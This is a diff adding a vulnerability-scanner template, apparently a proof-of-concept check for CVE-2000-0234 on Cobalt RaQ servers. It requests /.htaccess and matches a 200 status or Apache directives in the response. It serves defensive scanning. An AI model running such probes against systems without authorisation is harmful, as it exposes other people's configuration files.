@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测Cobalt RaQ2/RaQ3服务器是否因默认access.conf配置允许未授权访问.htaccess文件，导致敏感配置信息泄露"
+id = "POC-AVE-2000-0212"
+name = "CVE-2000-0234 PoC"
+severity = "medium"
+tags = ["ave-2000-0212"]
+vuln_id = [
+    "CVE-2000-0234",
+    "AVE-2000-0212",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/.htaccess"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "AuthType",
+    "Require",
+    "Order allow",
+    "Order deny",
+    "RewriteRule",
+    "RewriteCond",
+]
